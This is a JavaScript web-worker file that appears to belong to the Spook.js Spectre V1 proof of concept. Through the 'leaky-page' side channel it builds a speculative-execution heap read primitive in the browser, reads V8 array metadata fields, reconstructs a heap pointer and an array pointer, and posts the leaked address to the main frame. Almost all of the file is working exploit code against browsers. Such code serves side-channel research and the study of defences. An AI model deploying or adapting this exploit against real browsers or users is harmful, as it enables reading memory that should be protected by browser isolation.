self.importScripts('leaky-page/leaky-page.js', 'util.js');

/**
 * Construct a heap read primitive using leaky-page (Spectre V1 - limited to the javascript execution heap)
 * Calculate an offset to the last array, and read its ext_ptr_2 and base_ptr fields
 * These fields can be used to construct a pointer to the data for the last array.
 * Construct this pointer and send it back to spook.js running in the main frame.
 */
function main() {
    const secret = " secret secret secret secret 123";
    const secretData = Array.from(secret).map(x => x.charCodeAt(0));

    const result = createHeapReadPrimitive(secretData);
    if (result === null) {
        return null;
    }

    const {pageOffset, index, leak} = result;

    // Construct an offset from the SpectreV1 array to the end of the last array (chosen arbitrarily)
    const ARRAY_LENGTH = 0xA4;
    const ARRAY_END = 0x20 + ARRAY_LENGTH * (64 - index - 1);

    // Verify that the primitive was constructed correctly.
    const value = mode(100, () => leak(ARRAY_END - 32));
    if (value !== 0x3F) {
        err("Failed to construct heap read primitive");
        return;
    }
    log("Heap read primitive successfully constructed.");

    // Calculate an offset to the beginning of the last array
    const ARRAY_START = ARRAY_END - ARRAY_LENGTH + 0x38;

    // Read ext_ptr_2
    const BasePointer = BigInt(
        (mode(100, x => leak(ARRAY_START + 44)) << 0) |
        (mode(100, x => leak(ARRAY_START + 45)) << 8)
    ) << 32n;

    log(`Leaked heap pointer : 0x${BasePointer.toString(16)}`);

    // Read base_ptr
    const ArrayPointer = BigInt(
        (mode(100, x => leak(ARRAY_START + 48)) << 0) |
        (mode(100, x => leak(ARRAY_START + 49)) << 8) |
        (mode(100, x => leak(ARRAY_START + 50)) << 16) |
        (mode(100, x => leak(ARRAY_START + 51)) << 24)
    ) + 0x07n + BasePointer;
    log(`Leaked array pointer: 0x${ArrayPointer.toString(16)}`);

    postMessage({ type: 'array_ptr', address: ArrayPointer });
}
main();

function onmessage() { }